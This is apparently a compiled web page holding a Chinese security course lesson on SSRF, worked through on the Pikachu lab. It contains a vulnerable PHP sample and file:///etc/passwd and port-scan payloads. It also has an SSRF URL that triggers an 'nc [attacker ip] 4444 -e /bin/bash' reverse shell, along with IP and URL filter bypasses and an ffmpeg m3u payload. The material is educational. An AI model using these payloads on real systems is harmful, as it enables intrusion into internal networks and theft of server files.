import{_ as o,j as e,o as t,g as r,k as l,h as a,s,Q as p}from"./chunks/framework.4e7d56ce.js";const K=JSON.parse('{"title":"什么是 SSRF 漏洞？ ","description":"","frontmatter":{},"headers":[],"relativePath":"posts/backEnd/Web 安全攻防之道_文档/(5978) 10  SSRF 漏洞：外网隔离就绝对安全了吗？.md","filePath":"posts/backEnd/Web 安全攻防之道_文档/(5978) 10  SSRF 漏洞：外网隔离就绝对安全了吗？.md","lastUpdated":1696417798000}'),c={name:"posts/backEnd/Web 安全攻防之道_文档/(5978) 10  SSRF 漏洞：外网隔离就绝对安全了吗？.md"},i=s("p",null,"上一讲我们介绍了 CSRF 漏洞的产生原理、攻击手法、检测与防御手段，这一讲开始我会向你介绍 SSRF。",-1),y=s("p",null,"从名字来看，SSRF 跟 CSRF 就有点相近，其实它们的技术原理也有相似之处，但攻击目标是完全不同的：SSRF 是针对服务端的攻击。",-1),E=s("p",null,"想知道更具体的技术细节吗？跟我一块学习下面的内容吧！",-1),h=s("h3",{id:"什么是-ssrf-漏洞",tabindex:"-1"},[a("什么是 SSRF 漏洞？ "),s("a",{class:"header-anchor",href:"#什么是-ssrf-漏洞","aria-label":'Permalink to "什么是 SSRF 漏洞？"'},"​")],-1),d=s("p",null,"SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。",-1),F=s("p",null,"SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。",-1),g=s("p",null,"请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。",-1),u=p('<p>图 1：SSRF 原理</p><p>所以说，在 SSRF 漏洞面前，哪怕是外网隔离的内网机器也无法保证绝对的安全。</p><p>以 Pikachu 靶场中的 SSRF（curl）题目为例，如下图中，点击&quot;累了吧，来读一首诗吧&quot;之后会发起以下请求：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php</span></span></code></pre></div>',4),_=p('<p>图 2：Pikachu SSRF（curl）</p><p><strong>注意其中的 url 参数，</strong> 如果我们将其修改为&quot;<a href="http://baidu.com" target="_blank" rel="noreferrer">http://baidu.com</a>&quot;：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://baidu.com</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://baidu.com</span></span></code></pre></div><p>那么它就会打开百度，这是服务端在向百度发起请求，并将返回内容回显到页面上的结果。</p>',4),S=p(`<p>图 3：利用 SSRF 向百度发起请求</p><p>查看 ssrf（curl）题目的 php 源码，你会发现源码中本就有一些注释和利用思路的测试：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">......</span></span>
<span class="line"><span style="color:#E1E4E8;">	$PIKA_ROOT_DIR </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">  </span><span style="color:#9ECBFF;">&quot;../../&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">include_once</span><span style="color:#E1E4E8;"> $PIKA_ROOT_DIR</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&#39;header.php&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//payload:</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//file:///etc/passwd  读取文件</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//http://192.168.1.15:22 根据 banner 返回,错误提示,时间延迟扫描端口</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;url&#39;</span><span style="color:#E1E4E8;">]) </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $_GET[</span><span style="color:#9ECBFF;">&#39;url&#39;</span><span style="color:#E1E4E8;">] </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">null</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#6A737D;">//接收前端 URL 没问题,但是要做好过滤,如果不做过滤,就会导致 SSRF</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $URL </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $_GET[</span><span style="color:#9ECBFF;">&#39;url&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $CH </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">curl_init</span><span style="color:#E1E4E8;">($URL);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#79B8FF;">curl_setopt</span><span style="color:#E1E4E8;">($CH, </span><span style="color:#79B8FF;">CURLOPT_HEADER</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">FALSE</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#79B8FF;">curl_setopt</span><span style="color:#E1E4E8;">($CH, </span><span style="color:#79B8FF;">CURLOPT_SSL_VERIFYPEER</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">FALSE</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $RES </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">curl_exec</span><span style="color:#E1E4E8;">($CH);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#79B8FF;">curl_close</span><span style="color:#E1E4E8;">($CH) ;</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//ssrf 的问题是:前端传进来的 url 被后台使用 curl_exec()进行了请求,然后将请求的结果又返回给了前端</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//除了 http/https 外,curl 还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//curl 支持很多协议，有 FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> $RES;</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">......</span></span>
<span class="line"><span style="color:#24292E;">	$PIKA_ROOT_DIR </span><span style="color:#D73A49;">=</span><span style="color:#24292E;">  </span><span style="color:#032F62;">&quot;../../&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">include_once</span><span style="color:#24292E;"> $PIKA_ROOT_DIR</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&#39;header.php&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//payload:</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//file:///etc/passwd  读取文件</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//http://192.168.1.15:22 根据 banner 返回,错误提示,时间延迟扫描端口</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;url&#39;</span><span style="color:#24292E;">]) </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $_GET[</span><span style="color:#032F62;">&#39;url&#39;</span><span style="color:#24292E;">] </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">null</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#6A737D;">//接收前端 URL 没问题,但是要做好过滤,如果不做过滤,就会导致 SSRF</span></span>
<span class="line"><span style="color:#24292E;">	    $URL </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $_GET[</span><span style="color:#032F62;">&#39;url&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	    $CH </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">curl_init</span><span style="color:#24292E;">($URL);</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#005CC5;">curl_setopt</span><span style="color:#24292E;">($CH, </span><span style="color:#005CC5;">CURLOPT_HEADER</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">FALSE</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#005CC5;">curl_setopt</span><span style="color:#24292E;">($CH, </span><span style="color:#005CC5;">CURLOPT_SSL_VERIFYPEER</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">FALSE</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	    $RES </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">curl_exec</span><span style="color:#24292E;">($CH);</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#005CC5;">curl_close</span><span style="color:#24292E;">($CH) ;</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//ssrf 的问题是:前端传进来的 url 被后台使用 curl_exec()进行了请求,然后将请求的结果又返回给了前端</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//除了 http/https 外,curl 还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//curl 支持很多协议，有 FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> $RES;</span></span>
<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>漏洞的产生正是将 GET 参数 url 直接传递给 curl_exec 去访问，并调用 echo 将请求结果输出到页面，这正是设置&quot;url=<a href="http://baidu.com" target="_blank" rel="noreferrer">http://baidu.com</a>&quot;后，会打开百度的原因。</p><h3 id="ssrf-的危害" tabindex="-1">SSRF 的危害 <a class="header-anchor" href="#ssrf-的危害" aria-label="Permalink to &quot;SSRF 的危害&quot;">​</a></h3><p>基于前面介绍的 SSRF 原理，我们可以梳理出它可能出现的一些危害。</p><ul><li><p><strong>内网探测</strong>：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。</p></li><li><p><strong>窃取本地和内网敏感数据</strong>：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。</p></li><li><p><strong>攻击服务器本地或内网应用</strong>：利用发现的漏洞进一步发起攻击利用。</p></li><li><p><strong>跳板攻击</strong>：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。</p></li><li><p><strong>绕过安全防御</strong>：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。</p></li><li><p><strong>拒绝服务攻击</strong>：请求超大文件，保持链接 Keep-Alive Always。</p></li></ul><p>你可以自己发挥脑洞去挖掘更多的可能的攻击场景，欢迎在留言区留言、讨论。</p><h3 id="常见的利用与限制绕过方法" tabindex="-1">常见的利用与限制绕过方法 <a class="header-anchor" href="#常见的利用与限制绕过方法" aria-label="Permalink to &quot;常见的利用与限制绕过方法&quot;">​</a></h3><p>说了这么多，那我们来看一下 SSRF 漏洞常见的利用方法和绕过限制的手段。</p><h4 id="_1-利用支持的-url-schema-发起请求伪造" tabindex="-1">1.利用支持的 URL Schema 发起请求伪造 <a class="header-anchor" href="#_1-利用支持的-url-schema-发起请求伪造" aria-label="Permalink to &quot;1.利用支持的 URL Schema 发起请求伪造&quot;">​</a></h4><p>不仅仅只是常见的 http/https 协议，OWASP 曾整理过一份相对比较完整的 URL Schema，这里我发出来供你参考一下：</p>`,12),A=s("p",null,"图 4：常用于 SSRF 的 URL Scheme",-1),C=s("p",null,[a("在利用初期，你可以尝试下目标支持哪些 URL Schema，但有一点需要提醒下："),s("strong",null,"有些应用会自定义一些 URL Schema，如果它支持本地或网络地址请求，要注意避免遗漏掉"),a("。")],-1),D=s("h4",{id:"_2-读取本地文件",tabindex:"-1"},[a("2.读取本地文件 "),s("a",{class:"header-anchor",href:"#_2-读取本地文件","aria-label":'Permalink to "2.读取本地文件"'},"​")],-1),b=s("p",null,"从图 4 可以看到，除了 http/https 协议外，File 也是各场景通用的伪协议，利用它我们可以读取服务器的本地文件，比如 /etc/passwd、/proc/self/environ......",-1),f=p('<p>图 5：利用 SSRF 读取服务器本地文件</p><h4 id="_3-攻击内网应用漏洞" tabindex="-1">3.攻击内网应用漏洞 <a class="header-anchor" href="#_3-攻击内网应用漏洞" aria-label="Permalink to &quot;3.攻击内网应用漏洞&quot;">​</a></h4><p>前期可以利用 SSRF 漏洞对内网存活 IP 或域名进行漏洞扫描。以前在公司就曾遇到过这样一种情况：有些业务为了测试，在内网搭建了一些存在漏洞；或是有漏洞没有及时修复，理由是在内网没影响。然后，有一些被外部 SSRF 漏洞打进来了，利用了 Struts2 漏洞控制了内网服务器。</p><p>比如内网有一台存在代码执行漏洞（<a href="http://192.168.x.x/vul.php?cmd=whoami%EF%BC%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%AA%E5%BC%80%E5%A4%96%E7%BD%91%EF%BC%8C%E9%82%A3%E4%B9%88%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8" target="_blank" rel="noreferrer">http://192.168.x.x/vul.php?cmd=whoami）的服务器未开外网，那么攻击者就可以利用</a> SSRF 漏洞来攻击该内网服务器。以 Pikachu 靶场 SSRF（curl）题目为例，可以构造如下链接来获取内网服务器的 shell 控制权限：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://192.168.x.x/vul.php?cmd=nc [攻击者 ip] 4444 --e /bin/bash;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://192.168.x.x/vul.php?cmd=nc [攻击者 ip] 4444 --e /bin/bash;</span></span></code></pre></div><h4 id="_4-绕过-ip-限制" tabindex="-1">4.绕过 IP 限制 <a class="header-anchor" href="#_4-绕过-ip-限制" aria-label="Permalink to &quot;4.绕过 IP 限制&quot;">​</a></h4><p>有些网站可能会限制访问 IP，此时就可以尝试使用以下方法绕过：</p><ul><li><p><strong>IPv6 地址</strong>，如 <a href="http://2000" target="_blank" rel="noreferrer">http://2000</a>::1:2345:6789:abcd；</p></li><li><p><strong>十进制 IP</strong>，如 <a href="http://2130706433" target="_blank" rel="noreferrer">http://2130706433</a>，相当于 127.0.0.1；</p></li><li><p><strong>八进制 IP</strong>，如 <a href="http://0177.0.0.01" target="_blank" rel="noreferrer">http://0177.0.0.01</a>，相当于 127.0.0.1；</p></li><li><p><strong>十六进制 IP</strong>，如 <a href="http://0x7f.0x0.0x0.0x1" target="_blank" rel="noreferrer">http://0x7f.0x0.0x0.0x1</a>，相当于 127.0.0.1；</p></li><li><p><strong>多进制混合 IP</strong>，如 <a href="http://0177.0x0.0x0.1" target="_blank" rel="noreferrer">http://0177.0x0.0x0.1</a>，相当于 127.0.0.1；</p></li><li><p><strong>Localhost 替代</strong>，如 <a href="http://127.127.127.127" target="_blank" rel="noreferrer">http://127.127.127.127</a>、<a href="http://0.0.0.0" target="_blank" rel="noreferrer">http://0.0.0.0</a>、<a href="http://127.1" target="_blank" rel="noreferrer">http://127.1</a> 等。</p></li></ul><h4 id="_5-绕过-url-解析限制" tabindex="-1">5.绕过 URL 解析限制 <a class="header-anchor" href="#_5-绕过-url-解析限制" aria-label="Permalink to &quot;5.绕过 URL 解析限制&quot;">​</a></h4><p>如果存在 URL 限制，可以尝试以下方法绕过：</p><ul><li><p><strong>使用其他可用的协议</strong>，可参考图 4 进行测试；</p></li><li><p><strong>URL 欺骗方式</strong>，如 <a href="http://127.1.1.1@127.2.2.2" target="_blank" rel="noreferrer">http://127.1.1.1@127.2.2.2</a>、<a href="http://evil$google.com" target="_blank" rel="noreferrer">http://evil$google.com</a>、<a href="http://google.com#@evil.com" target="_blank" rel="noreferrer">http://google.com#@evil.com</a>......</p></li><li><p><strong>302 跳转切换协议</strong>，如请求头注入&quot;Location: dict://lagou.com&quot;</p></li><li><p><strong>Unicode 转换</strong>，如 <a href="http://evil.c" target="_blank" rel="noreferrer">http://evil.c</a> ℀.office.com</p></li></ul><p>以上我向你介绍了一些常见的 SSRF 限制策略与绕过手段，这些情况还是比较常用的，甚至有些漏洞修复后，用上述方法又被绕过了。掌握限制绕过方法也是挖掘 SSRF 漏洞的必备技巧，下面，我再来带你了解下如何挖掘 SSRF 漏洞。</p><h3 id="ssrf-漏洞挖掘思路" tabindex="-1">SSRF 漏洞挖掘思路 <a class="header-anchor" href="#ssrf-漏洞挖掘思路" aria-label="Permalink to &quot;SSRF 漏洞挖掘思路&quot;">​</a></h3><p>要进行 SSRF 漏洞的防御，我们先要判断是否存在 SSRF 漏洞。</p><h4 id="_1-如何判断是否存在-ssrf-漏洞" tabindex="-1">1.如何判断是否存在 SSRF 漏洞 <a class="header-anchor" href="#_1-如何判断是否存在-ssrf-漏洞" aria-label="Permalink to &quot;1.如何判断是否存在 SSRF 漏洞&quot;">​</a></h4><p>判断 SSRF 漏洞是否存在，主要有以下 4 种方式：</p><ul><li><p><strong>回显判断</strong>：如图 3 那种有返回请求结果并会显示出来，这种比较好判断。</p></li><li><p><strong>访问日志检查</strong>：伪造请求到自己控制的公网服务器，然后在服务器上查看访问日志是否有来自漏洞服务器的请求，或者直接使用命令&quot;nc -lvp&quot;来监听请求。</p></li><li><p><strong>延时对比</strong>：对比访问不同 IP/域名的访问时长，比如对百度与 Google（国内访问受限）的访问时间，访问百度的时间通常比Google快，若是则可能存在漏洞。</p></li><li><p><strong>DNS 请求检测</strong> ：自己搭建 DNS 服务器，或者利用网上的 DNSLog 服务（比如<a href="http://www.dnslog.cn/" target="_blank" rel="noreferrer">http://www.dnslog.cn/</a>），生成一个域名（l08bgh.dnslog.cn）用于伪造请求，看漏洞服务器是否发起 DNS 解析请求，若成功访问在 DNSLog.cn 上就会有解析日志。</p></li></ul><p>构建以下链接，访问后再 DSNLog 上就会看到相应的解析日志了：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://l08bgh.dnslog.cn</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://l08bgh.dnslog.cn</span></span></code></pre></div>',19),R=p(`<p>图 6：DNSLog 请求日志</p><h4 id="_2-容易出现-ssrf-漏洞的业务场景" tabindex="-1">2.容易出现 SSRF 漏洞的业务场景 <a class="header-anchor" href="#_2-容易出现-ssrf-漏洞的业务场景" aria-label="Permalink to &quot;2.容易出现 SSRF 漏洞的业务场景&quot;">​</a></h4><p>以上我向你介绍了 SSRF 的危害，哪些地方比较容易出现 SSRF 漏洞呢？我主要分了 4 个方面来说。</p><ul><li><p><strong>凡是能够对外发起网络请求的地方，且地址可被用户可控的，都有可能存在 SSRF 漏洞。</strong> 比如 RSS 订阅、字幕下载、支持输入 URL 的功能、嵌入远程图片、收取第三方邮箱邮件。一些不明显的地方，可以通过爬包分析，从参数名来猜测，比如 url、domain、site、src、target 等常见关键词来做进一步地测试验证。</p></li><li><p><strong>文件处理功能。</strong> 比如负责处理音视频的 ffmpeg，负责处理图片的 ImageMagic、处理办公文件的Office，PDF 文档解析功能，还有 XML 解析器等地方，尤其是 ffmpeg 和 ImageMagic，它们曾多次出现过 SSRF 漏洞。</p><p>ffmpeg 在解析 mp4 文件时就曾出现过以下漏洞，构造一个包含以下内容的 mp4 文件，上传到支持音频解析的网站就可能造成 SSRF 漏洞。<strong>这种应用漏洞记得平时多收集，在实际渗透测试时非常有用</strong>。</p></li></ul><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">#EXTM3U</span></span>
<span class="line"><span style="color:#E1E4E8;">#EXT</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">X</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">MEDIA</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">SEQUENCE</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">0</span></span>
<span class="line"><span style="color:#E1E4E8;">#EXTINF</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">10.0</span><span style="color:#E1E4E8;">,http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//192.168.123.100:8080/1.html</span></span>
<span class="line"><span style="color:#E1E4E8;">#EXT</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">X</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">ENDLIST</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">#EXTM3U</span></span>
<span class="line"><span style="color:#24292E;">#EXT</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">X</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">MEDIA</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">SEQUENCE</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">0</span></span>
<span class="line"><span style="color:#24292E;">#EXTINF</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">10.0</span><span style="color:#24292E;">,http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//192.168.123.100:8080/1.html</span></span>
<span class="line"><span style="color:#24292E;">#EXT</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">X</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">ENDLIST</span></span></code></pre></div><ul><li><p><strong>社交分享功能</strong>， 社交分享也是容易出现 SSRF 漏洞的地方。</p></li><li><p><strong>信息采集功能</strong>，比如图片、文章收藏、网页快照、网页翻译、网页剪裁。</p></li></ul><p>我这里只是列举一些常见的场景，很难完全覆盖 SSRF 容易出现漏洞的场景，但核心思路就是理解业务功能，判断其是否存在对外发起网络请求，若是存在就有可能存在 SSRF 漏洞，然后进一步实际验证下，可以用下面介绍的 Burp Collaborator 作验证。</p><h3 id="检测-ssrf-的通用方法和工具" tabindex="-1">检测 SSRF 的通用方法和工具 <a class="header-anchor" href="#检测-ssrf-的通用方法和工具" aria-label="Permalink to &quot;检测 SSRF 的通用方法和工具&quot;">​</a></h3><h4 id="_1-方法-burp-collaborator" tabindex="-1">1.方法：Burp Collaborator <a class="header-anchor" href="#_1-方法-burp-collaborator" aria-label="Permalink to &quot;1.方法：Burp Collaborator&quot;">​</a></h4><p>这里我介绍个检测 SSRF 的通用方法，无法是否有回显都适用的，也是我个人比较喜欢用的，那就是 Burp Collaborator。BurpSuite 默认提供 Collaborator Server 用于实现 DNS 解析，在一些无回显的安全测试中，会将解析日志返回给 BurpSuite。</p><blockquote><p>不仅仅用于 SSRF，一些无回显的漏洞测试也同样适用，比如 SQL 注入。</p></blockquote>`,11),m=s("p",null,"图 7：BurpSuite 默认提供 Collaborator Server 作为 DNS 解析服务器",-1),v=s("p",null,"关于 Burp Collaborator 原理，我们可以看下面这张图：",-1),k=s("p",null,"图 8：Burp Collaborator 原理",-1),T=s("p",null,"图中可以看到，先利用 SSRF 漏洞让目标应用向 Burp 提供的 DNS 解析服务器 Burp Collaborator Server 发起请求，然后 Burp Collaborator Server 会查询对应的 DNS 请求记录并返回给 BurpSuite，从而帮助测试者判断 SSRF 漏洞是否存在。",-1),B=s("p",null,"仍以前面的靶场题目为例，打开 Burp Collaborator Client：",-1),P=s("p",null,'图 9：选择菜单"Burp Collaborator client"',-1),L=p('<p>图 10：Burp Collaborator client</p><p>点击&quot;Copy to clipboard&quot;获取生成的域名，我这里生成的是&quot;c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net&quot;，我们就可以构造如下利用链接：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost:8080/vul/ssrf/ssrf_curl.php?url=http://c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net</span></span></code></pre></div><p>访问后回到 Burp Collaborator client，点击&quot;Poll now&quot;就可以看到 DNS 请求记录，这说明存在 SSRF 漏洞。</p>',4),x=s("p",null,"图 11：获得 DNS 请求日志证明存在 SSRF 漏洞",-1),q=s("p",null,"这个检测方法比较通用简单，且无须自己搭建 DNS 服务器，非常方便，我强烈推荐。",-1),w=s("h4",{id:"_2-工具-ssrfmap",tabindex:"-1"},[a("2.工具：SSRFmap "),s("a",{class:"header-anchor",href:"#_2-工具-ssrfmap","aria-label":'Permalink to "2.工具：SSRFmap"'},"​")],-1),X=s("p",null,[a("这里给大家介绍一款 SSRF 检测工具："),s("a",{href:"https://github.com/swisskyrepo/SSRFmap",target:"_blank",rel:"noreferrer"},"SSRFmap"),a("，利用它可检测与利用 SSRF 漏洞， 同时它也整合了一些常用漏洞可以结合 SSRF 去利用，比如 fastjson、mysql、github 的一些历史漏洞，还有端口扫描、读取文件等利用功能，都是实用的漏洞利用能力。")],-1),$=s("p",null,"使用上会比 Burp Collaborator 便捷，但检测能力上其实没有 Burp Collaborator 那样准确，SSRFmap 有时会利用失败。所以个人推荐使用 Burp Collaborator 用来检测 SSRF 是否存在，再使用 SSRFmap 做一些漏洞利用，比如读取敏感文件等操作。",-1),I=s("p",null,"SSRFmap 是以 HTTP 请求数据作为文件输入，使用命令如下：",-1),N=p(`<p>图 12：SSRFmap</p><p>用其自带的测试用例，试用下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">FLASK_APP</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">data</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">example.py flask run </span><span style="color:#F97583;">&amp;</span></span>
